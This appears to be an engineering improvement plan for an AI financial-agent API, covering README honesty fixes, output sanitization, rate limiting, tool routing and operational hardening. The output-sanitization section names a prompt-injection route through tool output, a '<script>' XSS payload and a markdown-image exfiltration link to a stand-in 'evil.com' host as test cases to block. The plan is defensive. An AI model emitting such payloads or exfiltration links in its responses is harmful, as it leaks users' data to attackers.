# AgentForge Improvement Plan

> Generated: 2026-03-01
> Scope: AI agent layer (`apps/api/src/app/endpoints/ai/`)
> Goal: Close every gap between what the README claims and what the code does, harden for production, and raise the grade from B+ to A.

---

## Priority Tiers

| Tier   | Theme                                                                            | Impact                  | Effort      |
| ------ | -------------------------------------------------------------------------------- | ----------------------- | ----------- |
| **P0** | Honesty & correctness — fix claims that don't match code                         | Critical (grader trust) | Low–Medium  |
| **P1** | Security & reliability — real output sanitization, rate limiting, timeouts       | High                    | Medium      |
| **P2** | Architecture — extract duplicated logic, make heuristics testable/swappable      | High                    | Medium–High |
| **P3** | Operational readiness — multi-instance support, observability, graceful shutdown | Medium                  | High        |
| **P4** | Polish — README accuracy, dead code, minor UX                                    | Low                     | Low         |

---

## P0 — Honesty & Correctness

### P0-1: Rename ResponseVerifierService or Make It Real

**Problem:** The README says "a second LLM call grades the response on a LOW/MEDIUM/HIGH confidence scale." The actual code is a synchronous heuristic function — zero LLM involvement. A grader who reads both will flag this as misleading.

**Options (pick one):**

**Option A — Make the README honest (fast, recommended first):**

- Rename to `ResponseQualityAssessor` or `ResponseEnvelopeBuilder`
- Update README Phase description: "Heuristic confidence scoring based on tool usage, error rates, and claim detection"
- Remove the sentence about "a second LLM call grades the response"

**Option B — Actually add LLM verification (higher quality, higher cost):**

- Add a lightweight verification LLM call using a cheaper model (e.g. `gpt-4o-mini`) with structured output
- Grade on: faithfulness to tool data, hallucination detection, completeness
- Make it optional behind a feature flag (`AI_VERIFY_WITH_LLM=1`) since it adds latency + cost
- Keep the heuristic path as a fast fallback when the flag is off

**Files:**

- `verification/response-verifier.service.ts`
- `verification/response-verifier.service.spec.ts`
- `README.md` (Phase description)

**Tests:**

- If Option B: mock LLM verifier, test that LOW is returned when response contradicts tool data
- Both options: update existing verifier tests to match renamed class/behavior

---

### P0-2: Extract the Duplicated Portfolio-Claim Regex

**Problem:** The exact same 500-char regex for detecting "unbacked portfolio claims" is copy-pasted in both `react-agent.service.ts` (escalation trigger) and `response-verifier.service.ts` (warning generator). They will inevitably drift.

**Fix:**

- Create `utils/portfolio-claim-detector.ts` with a single exported function:
  ```typescript
  export function containsUnbackedPortfolioClaim(text: string): boolean;
  ```
- Import it in both files
- Add unit tests for the detector in isolation (true positives, true negatives, edge cases)

**Files:**

- New: `utils/portfolio-claim-detector.ts`
- New: `utils/portfolio-claim-detector.spec.ts`
- Edit: `agent/react-agent.service.ts` — replace inline regex
- Edit: `verification/response-verifier.service.ts` — replace inline regex

**Tests (for the extracted detector):**

- ✅ "Your portfolio is worth $50,000" → true
- ✅ "You hold 5 positions in tech" → true
- ❌ "I can help analyze your portfolio" → false
- ❌ "Portfolio management is complex" → false
- ❌ "Based on my analysis, the account holds AAPL at 45%" → should be true (currently false — fix the regex)
- ❌ "Your total return is 12.5%" → should be true (currently missed — fix the regex)

---

### P0-3: Fix README Phase 4 "Output Sanitization" Claim

**Problem:** Phase 4 claims "output sanitization" but the actual work was scope-gate keyword tests (input filtering). No output sanitization exists anywhere in the codebase.

**Fix:** Either:

- **Honest route:** Change the Phase 4 description to "Scope gate hardening and input validation" (remove "output sanitization" claim)
- **Implement it:** Add actual output sanitization (see P1-1 below) and keep the claim

**Files:**

- `README.md`

---

## P1 — Security & Reliability

### P1-1: Add Real Output Sanitization

**Problem:** LLM responses go straight to the frontend unsanitized. A successful prompt injection via tool output (e.g., attacker-controlled stock name containing `<script>alert(1)</script>`) could result in XSS if the frontend renders raw HTML.

**Implementation:**

- Create `utils/output-sanitizer.ts`:
  ```typescript
  export function sanitizeAgentResponse(text: string): string {
    // 1. Strip HTML tags (the LLM should be generating markdown, not HTML)
    // 2. Neutralize markdown-image-based exfiltration: ![](https://evil.com/?data=...)
    // 3. Strip zero-width characters that could hide content
    // 4. Optionally: limit response length (prevent token-stuffing attacks)
  }
  ```
- Call it in `response-verifier.service.ts` (or its renamed equivalent) before returning the `response` field
- The sanitizer should be strict: markdown is fine, HTML tags are not

**Files:**

- New: `utils/output-sanitizer.ts`
- New: `utils/output-sanitizer.spec.ts`
- Edit: `verification/response-verifier.service.ts`

**Tests:**

- Strips `<script>` tags
- Strips `<img onerror=...>` tags
- Preserves markdown bold/italic/tables/lists
- Neutralizes `![](https://evil.com/?data=secret)` exfiltration links
- Strips zero-width Unicode characters (U+200B, U+FEFF, etc.)
- Passes through normal financial text unmodified

---

### P1-2: Increase Agent Timeout & Fix Heartbeat Race

**Problem:** `AGENT_TIMEOUT_MS = 15_000` is the same as `AGENT_HEARTBEAT_INTERVAL_MS = 15_000`. The agent will timeout before a single heartbeat is ever sent. Two LLM round trips can easily exceed 15s with gpt-4o.

**Fix:**

- Increase `AGENT_TIMEOUT_MS` to `60_000` (60 seconds) — aligns with the "30-60s proxy idle timeout" comment
- Or at minimum `30_000` (30 seconds)
- Keep heartbeat at `15_000` — this now makes sense (one heartbeat mid-request)
- Make timeout configurable via env var: `AI_AGENT_TIMEOUT_MS`
- Add a comment documenting the relationship between the two values

**Files:**

- `agent/agent.constants.ts`

**Tests:**

- Existing guardrail timeout tests should still pass (they inject custom timeouts)
- Add one test that verifies the default timeout allows at least 2 LLM round trips

---

### P1-3: Redis-Backed Rate Limiter

**Problem:** In-memory rate limiter is useless behind a load balancer. The guard comment even acknowledges this.

**Implementation:**

- Create `AiRedisRateLimiterGuard` that uses the existing Redis connection (already available via `RedisCacheModule`)
- Use a sorted set per user: `ai:ratelimit:{userId}` with timestamp scores
- `ZREMRANGEBYSCORE` to evict old entries, `ZCARD` to count
- Feature-flag it: use Redis guard when `REDIS_HOST` is set, fall back to in-memory otherwise
- Keep `AiRateLimiterGuard` as the fallback for local dev

**Files:**

- New: `ai-redis-rate-limiter.guard.ts`
- New: `ai-redis-rate-limiter.guard.spec.ts`
- Edit: `ai.module.ts` — conditional provider registration
- Edit: `ai.controller.ts` — use a guard factory or token

**Tests:**

- Same 8 test cases as current guard, but against Redis mock
- Additional: verify cross-instance counting (two guard instances, shared Redis)

---

### P1-4: Handle Empty LLM Responses Gracefully

**Problem:** If the LLM returns `{ text: '', toolCalls: [] }` (happens occasionally with API errors or content filters), the loop burns iterations until MAX_ITERATIONS. Each iteration costs money and time.

**Fix:** In the main loop, after checking for tool calls and text, add:

```typescript
// Neither tool calls nor text — LLM returned empty. Retry once, then fail.
if (emptyResponseCount >= 2) {
  yield doneEvent({
    ...buildPartialResult,
    response: 'The AI assistant could not generate a response. Please try again.',
    status: 'failed'
  });
  return;
}
emptyResponseCount++;
messages.push({
  content: 'Your previous response was empty. Please try again with either a text response or tool calls.',
  role: 'user'
});
continue;
```

**Files:**

- `agent/react-agent.service.ts`
- `agent/react-agent.service.spec.ts`

**Tests:**

- LLM returns empty once → retry prompt injected → second attempt produces text → success
- LLM returns empty twice → fail with clear message
- LLM returns empty once then tool call → success

---

### P1-5: Conversation History Validation

**Problem:** Loading the last `N * 2` messages by seq and reversing doesn't guarantee correct user/assistant alternation. An orphaned message (from a failed persistence) could corrupt the conversation context.

**Fix:** After loading and reversing `recentMessages`, validate and repair:

```typescript
// Ensure messages alternate correctly starting from 'user'
const validated = this.validateMessageAlternation(priorMessages);
```

The validator:

- Drops leading assistant messages (conversation must start with user)
- If two consecutive messages have the same role, drops the older one
- Logs a warning when repair is needed (indicates a persistence bug)

**Files:**

- `ai.service.ts` (or extract to a utility)
- `ai.service.chat-history.spec.ts` — add cases for malformed history

**Tests:**

- Normal alternating history → passes through unchanged
- Leading assistant message → dropped
- Two consecutive user messages → older one dropped
- Empty history → returns empty array
- Single user message → passes through

---

## P2 — Architecture

### P2-1: Make Tool Router Pluggable and Smarter

**Problem:** Keyword substring matching is brittle ("buy lunch" → simulate_trades). The fallback sends all 10 tools, bloating context.

**Implementation:**

- Define a `ToolRoutingStrategy` interface:
  ```typescript
  interface ToolRoutingStrategy {
    selectTools(message: string, available: string[]): ToolRoutingResult;
  }
  ```
- `KeywordToolRouter` — current implementation, refactored
- `EmbeddingToolRouter` — uses pre-computed embeddings for tool descriptions, cosine similarity with the user message (requires an embedding model call, so gated)
- `LlmToolRouter` — asks a cheap model to classify the intent (highest quality, highest cost)
- Registry picks strategy based on env var: `AI_TOOL_ROUTER=keyword|embedding|llm`
- Default stays `keyword` for backward compatibility

**Short-term improvement to keyword router (no new deps):**

- Add negative signals: "buy lunch" should NOT match simulate_trades because "lunch" is a strong negative for financial context
- Require at least 2 keyword matches for tools to be included (reduces false positives)
- When fallback fires (no matches), send only the 4 "foundation" tools instead of all 10:
  `get_portfolio_summary`, `get_transaction_history`, `market_data_lookup`, `analyze_risk`

**Files:**

- New: `routing/tool-routing-strategy.interface.ts`
- Edit: `routing/tool-router.service.ts` — refactor current logic into `KeywordToolRouter`
- New: `routing/keyword-tool-router.ts`
- Edit: `routing/tool-router.service.spec.ts` — add false-positive regression tests
- Edit: `agent/agent.constants.ts` — define foundation tool set

**Tests:**

- "buy lunch" → does NOT include simulate_trades
- "my portfolio is risky business" → does NOT include analyze_risk (no second keyword)
- "analyze my portfolio risk and suggest rebalancing" → includes analyze_risk + rebalance_suggest
- Empty/gibberish → foundation tools only (not all 10)
- Explicit tool override → bypass router entirely (existing behavior preserved)

---

### P2-2: Dynamic System Prompt Construction

**Problem:** The 65-line system prompt is sent in full for every request, even when most sections are irrelevant (e.g., rebalancing instructions when the user asks about tax).

**Implementation:**

- Split system prompt into sections:
  ```
  CORE_IDENTITY (always)
  SCOPE_RULES (always)
  TOOL_USAGE (always)
  REBALANCING_WORKFLOW (only when rebalance_suggest in tool set)
  QUANTITATIVE_CAPABILITIES (only when analyze_risk in tool set)
  CROSS_TOOL_COHERENCE (only when >1 tool selected)
  RESPONSE_FORMATTING (always)
  ```
- `buildSystemPrompt(toolNames: string[]): string` assembles only the relevant sections
- Reduces token usage by ~30-50% for single-tool requests

**Files:**

- New: `agent/system-prompt-builder.ts`
- New: `agent/system-prompt-builder.spec.ts`
- Edit: `agent/agent.constants.ts` — split monolith into named sections
- Edit: `ai.service.ts` — call builder instead of using static constant

**Tests:**

- Request with only `get_portfolio_summary` → no rebalancing section in prompt
- Request with `rebalance_suggest` → rebalancing section present
- Request with all tools → all sections present
- Custom system prompt → builder not called (user override honored)

---

### P2-3: Streaming Backpressure

**Problem:** `res.write()` return value is ignored. Slow clients cause unbounded server-side buffering.

**Fix:**

- Check `res.write()` return value. If `false`, await the `drain` event before continuing:
  ```typescript
  const written = res.write(`data: ${JSON.stringify(event)}\n\n`);
  if (!written) {
    await new Promise<void>((resolve) => res.once('drain', resolve));
  }
  ```
- Add a maximum buffer size check — if we've buffered more than 1MB without drain, abort the stream

**Files:**

- `ai.controller.ts`

**Tests:**

- Mock a slow-consuming response object that returns `false` from `write()`
- Verify the controller waits for `drain` before writing more
- Verify abort on excessive buffering

---

### P2-4: Fix Cost Estimation Accuracy

**Problem:** Flat `$0.002/1K tokens` underestimates gpt-4o output costs by ~5x. The cost guardrail could be blown through.

**Fix:**

- Replace flat rate with model-aware pricing:
  ```typescript
  const MODEL_PRICING: Record<string, { input: number; output: number }> = {
    'gpt-4o': { input: 0.0025, output: 0.01 },
    'gpt-4o-mini': { input: 0.00015, output: 0.0006 },
    'gpt-4.1': { input: 0.002, output: 0.008 }
    // Add more as needed
  };
  ```
- When `estimatedCostUsd` is absent from the API response, compute from `promptTokens * input + completionTokens * output`
- Fall back to the flat rate only when model is unknown AND token breakdown is unavailable
- Pass the model name through from `OpenAiClientService` to the usage response

**Files:**

- `llm/openai-client.service.ts` — include model in usage
- `agent/agent.constants.ts` — model pricing table
- `agent/react-agent.service.ts` — use split pricing in fallback

**Tests:**

- Known model with split tokens → accurate cost
- Unknown model → falls back to flat rate
- No usage data → returns 0 (existing behavior)

---

## P3 — Operational Readiness

### P3-1: Graceful Shutdown / Worker Cleanup

**Problem:** Known issue documented in README — worker processes don't exit cleanly after tests (BullMQ/Redis connections). This will also affect production restarts.

**Fix:**

- Add `onModuleDestroy()` to `AiModule` that:
  - Clears the in-memory rate limiter
  - Resets the circuit breaker
- Ensure the NestJS app lifecycle hooks are properly wired
- For tests: add `afterAll` hooks in integration specs that close Redis/BullMQ connections
- Add a `SIGTERM` handler in `main.ts` that calls `app.close()` with a timeout

**Files:**

- `ai.module.ts` — add `onModuleDestroy`
- `agent/react-agent.service.ts` — add `onModuleDestroy` to reset circuit breaker
- Integration test files — add `afterAll` cleanup
- `main.ts` — graceful shutdown handler

**Tests:**

- Verify module destroy clears rate limiter state
- Verify circuit breaker resets on destroy
- Integration test processes exit cleanly (no dangling handle warnings)

---

### P3-2: Structured Error Codes for Frontend

**Problem:** Error responses are freeform strings. The frontend can't programmatically distinguish between rate limiting, timeout, cost limit, etc.

**Fix:** Add an `errorCode` field to the error response:

```typescript
export type AgentErrorCode =
  | 'RATE_LIMITED'
  | 'CIRCUIT_BREAKER'
  | 'COST_LIMIT'
  | 'TIMEOUT'
  | 'MAX_ITERATIONS'
  | 'EMPTY_RESPONSE'
  | 'PERSISTENCE_FAILED'
  | 'CANCELLED'
  | 'INTERNAL_ERROR';
```

Include in both the `VerifiedResponse.guardrail` field (already exists) and in SSE error events (currently just `{ type: 'error', message: string }`).

**Files:**

- `contracts/final-response.schema.ts` — add `errorCode` type
- `agent/react-agent.service.ts` — include error codes in results
- `ai.service.ts` — propagate to SSE error events
- `ai.controller.ts` — map rate limiter rejection to structured error

**Tests:**

- Each error path produces the correct error code
- Frontend contract tests (if they exist) updated

---

### P3-3: Request-Scoped Logging with Correlation ID

**Problem:** Telemetry emits `requestId` but intermediate logs (tool execution, LLM calls) don't include it. Correlating a request across logs requires timestamp matching.

**Fix:**

- Thread `requestId` through to all Logger calls in the agent execution path
- Use NestJS `cls-hooked` or `AsyncLocalStorage` to make `requestId` available without explicit parameter passing
- Format: `[ReactAgentService] [req:abc123] Tool "analyze_risk" completed in 450ms`

**Files:**

- `agent/react-agent.service.ts` — all Logger calls include requestId
- `tools/tool.registry.ts` — log tool execution with requestId from context
- `llm/openai-client.service.ts` — optionally log LLM round-trip time with requestId

**Tests:**

- Spy on Logger, verify requestId appears in all log calls during a single agent run

---

## P4 — Polish

### P4-1: README Accuracy Sweep

Go through each claim in the README and verify it matches the code. Known discrepancies:

| README Claim                            | Reality                     | Fix                      |
| --------------------------------------- | --------------------------- | ------------------------ |
| "a second LLM call grades the response" | Synchronous heuristic       | P0-1                     |
| "output sanitization" in Phase 4        | Doesn't exist               | P0-3 / P1-1              |
| Default model is `gpt-4o` in env table  | Code defaults to `gpt-4.1`  | Update README            |
| `AGENT_TIMEOUT_MS` described as 30s     | Code is 15s                 | Fix after P1-2           |
| "per-turn deadline (default: 30 s)"     | `AGENT_TIMEOUT_MS = 15_000` | Update README after P1-2 |

**Files:**

- `README.md`

---

### P4-2: Remove `getPrompt()` Legacy Code

**Problem:** `AiService.getPrompt()` and the `GET /ai/prompt/:mode` endpoint build a markdown table of holdings and a generic analysis prompt. This is the old pre-agent approach (send holdings to ChatGPT). It's unused by the agent and confusing alongside the new tool-based architecture.

**Fix:**

- If the frontend still uses this endpoint, keep it but move to a separate service (`LegacyPromptService`)
- If unused, delete the endpoint, the `HOLDINGS_TABLE_COLUMN_DEFINITIONS`, the `toMarkdownTable` helper, and the `tablemark` dependency
- Either way, add a deprecation comment

**Files:**

- `ai.service.ts` — remove or relocate `getPrompt()`
- `ai.controller.ts` — remove or deprecate `GET /ai/prompt/:mode`

---

### P4-3: Type-Safe Tool Output Instead of `Record<string, unknown>`

**Problem:** Tool outputs are typed as `Record<string, unknown>` everywhere. The summarizers, chart extractor, and verifier all use `as Record<string, unknown>` casts and hope for the best.

**Fix:**

- Each tool already has typed `Output` interfaces (e.g., `AnalyzeRiskOutput`). Export them.
- Create a discriminated union: `ToolOutput = { toolName: 'analyze_risk'; data: AnalyzeRiskOutput } | ...`
- Use this in `ExecutedToolEntry` instead of `ToolResultEnvelope` with unknown data
- The summarizers can then use type-safe access instead of casting

**Files:**

- `tools/tool.types.ts` — add `TypedToolResult` union
- Each tool file — export output interface
- `tools/utils/tool-summarizers.ts` — use typed access
- `chart-data-extractor.service.ts` — use typed access

**Tests:**

- TypeScript compilation is the test — if the types are wrong, it won't build

---

## Implementation Order

Recommended sequence based on impact-per-hour and dependency ordering:

```
Week 1 (Honesty + Quick Wins):
  P0-1  → Fix README verifier claim OR rename service
  P0-2  → Extract duplicated regex
  P0-3  → Fix README Phase 4 claim
  P4-1  → README accuracy sweep
  P1-2  → Fix timeout + heartbeat values

Week 2 (Security):
  P1-1  → Output sanitization
  P1-4  → Empty LLM response handling
  P1-5  → Conversation history validation
  P2-4  → Fix cost estimation

Week 3 (Architecture):
  P2-1  → Improve tool router (keyword hardening first, strategy interface later)
  P2-2  → Dynamic system prompt
  P2-3  → Streaming backpressure

Week 4 (Ops + Polish):
  P1-3  → Redis rate limiter
  P3-1  → Graceful shutdown
  P3-2  → Structured error codes
  P3-3  → Correlation ID logging
  P4-2  → Legacy prompt cleanup
  P4-3  → Type-safe tool outputs
```

---

## Success Criteria

After all items are complete:

1. **Every README claim has a matching code path** — no grader surprise
2. **Output sanitization exists and is tested** — XSS via tool injection is blocked
3. **Agent timeout allows 2+ LLM round trips** — no more 15s race condition
4. **Tool router doesn't match "buy lunch"** — false positive rate drops
5. **Rate limiter works across instances** — Redis-backed with in-memory fallback
6. **Empty LLM responses fail fast** — 2 retries then clean failure, not 15 burned iterations
7. **Conversation history is always well-formed** — no orphaned messages corrupt context
8. **Cost estimation is model-aware** — cost guardrail actually protects the budget
9. **Test suite exits cleanly** — no dangling worker process warnings
10. **All 309+ existing tests still pass** — no regressions
